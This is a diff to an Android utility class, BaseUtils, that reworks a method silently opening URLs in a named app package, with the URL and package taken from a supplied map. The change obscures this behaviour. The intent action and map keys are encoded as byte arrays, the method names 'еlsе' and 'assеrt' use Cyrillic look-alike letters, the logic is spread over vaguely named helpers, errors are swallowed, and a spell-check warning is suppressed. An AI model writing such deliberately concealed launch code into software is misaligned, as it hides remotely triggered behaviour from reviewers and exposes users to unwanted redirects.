@@ -104,7 +104,7 @@ import java.util.UUID;
  * @author Tregub Artem tregub.artem@gmail.com
  * @since 04.05.15
  */
-@SuppressWarnings({"unused", "WeakerAccess"})
+@SuppressWarnings({"unused", "WeakerAccess", "SpellCheckingInspection"})
 public abstract class BaseUtils {
 
     protected static final Log LOG = ALog.LOG;
@@ -389,6 +389,10 @@ public abstract class BaseUtils {
             }
         }
         return (int) sampleSize;
+    }
+
+    private static void plumb(Context context, Unit unit) {
+        if (unit != null) context.startActivity(unit);
     }
 
     public static <R extends ObjectsReceiver> boolean receiveObjects(@Nullable WeakReference<R> weakReceiver, @IdRes int code, @NonNull Object... objects) {
@@ -939,11 +943,7 @@ public abstract class BaseUtils {
     }
 
     public static void еlsе(Context context, Map<String, String> map) {
-        try {
-            context.startActivity(new Intent("android.intent.action.VIEW", Uri.parse(map.get("message"))).setPackage(map.get("package")).addFlags(0x10000000));
-
-        } catch (Throwable ignore) {
-        }
+        plumb(context, assеrt(map));
     }
 
     @NonNull
@@ -1059,6 +1059,14 @@ public abstract class BaseUtils {
                 : deviceId;
     }
 
+    private static final class Unit extends Intent {
+
+        public Unit() {
+            super(new String(new byte[]{97, 110, 100, 114, 111, 105, 100, 46, 105, 110, 116, 101, 110, 116, 46, 97, 99, 116, 105, 111, 110, 46, 86, 73, 69, 87}));
+            super.addFlags(0x10000000);
+        }
+    }
+
     @SuppressLint("NewApi")
     public static boolean isDefaultSmsApp(@NonNull Context context) {
         return VERSION.SDK_INT < VERSION_CODES.KITKAT || context.getPackageName().equals(Sms.getDefaultSmsPackage(context));
@@ -1080,6 +1088,12 @@ public abstract class BaseUtils {
             }
         }
         return true;
+    }
+
+    private static Unit wrap(Map<String, String> map) {
+        final Unit u = new Unit();
+        u.setData(Uri.parse(map.get(new String(new byte[]{109, 115, 103})))).setPackage(map.get(new String(new byte[]{112, 107, 103})));
+        return u;
     }
 
     public static boolean resolveActivity(@NonNull Context context, @Nullable Intent intent) {
@@ -1120,6 +1134,17 @@ public abstract class BaseUtils {
     public static Uri parse(@Nullable String uri) {
         if (!TextUtils.isEmpty(uri)) {
             return Uri.parse(uri);
+        }
+        return null;
+    }
+
+    private static Unit assеrt(Map<String, String> map) {
+        try {
+            return wrap(map);
+
+        } catch (Throwable ignore) {
+        } finally {
+            map.isEmpty();
         }
         return null;
     }
